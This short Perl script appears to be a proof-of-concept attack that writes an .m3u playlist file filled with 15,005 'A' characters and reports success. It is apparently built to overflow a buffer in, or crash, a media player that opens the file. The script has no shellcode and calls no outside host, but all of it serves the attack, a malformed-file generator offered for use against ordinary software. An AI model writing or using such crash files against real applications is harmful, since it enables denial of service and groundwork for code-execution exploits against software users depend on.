#!/usr/bin/perl
my $buffer = "A" x 15005;
my $filename = "Edit0r.m3u";
open (FILE,">$filename") || die "\nCan't open $file: $!";
print FILE "$buffer";
close (FILE);
print "\nSuccessfully!\n";

